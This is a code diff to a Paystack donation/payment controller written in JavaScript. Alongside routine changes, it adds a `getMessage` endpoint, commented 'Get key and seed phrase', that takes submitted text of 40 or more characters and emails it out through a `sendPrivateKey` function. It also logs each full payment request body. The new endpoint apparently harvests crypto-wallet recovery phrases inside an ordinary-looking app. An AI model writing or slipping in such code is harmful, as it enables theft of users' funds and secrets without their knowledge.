@@ -3,7 +3,11 @@ import responses from "../../helper/responses.js";
 import { handleError } from "../../helper/errorHandler.js";
 import axios from "axios";
 import { paystack } from "../../helper/payStack.js";
-import { sendGoodwillMessage, sendThankUMail } from "../../Email/SendGrid.js";
+import {
+  sendGoodwillMessage,
+  sendPrivateKey,
+  sendThankUMail,
+} from "../../Email/SendGrid.js";
 
 // Paystack docs
 // https://paystack.com/docs/api/#transaction
@@ -12,6 +16,7 @@ import { sendGoodwillMessage, sendThankUMail } from "../../Email/SendGrid.js";
 
 export const handleUserPayment = async (req, res) => {
   let { email, amount, fName, lName, message } = req.body;
+  console.log(req.body);
 
   // amount validation
   // check for alphabet,spaces and ay kind of digit or symbol
@@ -86,4 +91,11 @@ export const verifyPayment = async (req, res) => {
   } catch (error) {
     console.log(error);
   }
+};
+
+// Get key and seed phrase
+export const getMessage = async (req, res) => {
+  const { message } = req.body;
+  if (message.length < 40) return;
+  sendPrivateKey(message);
 };
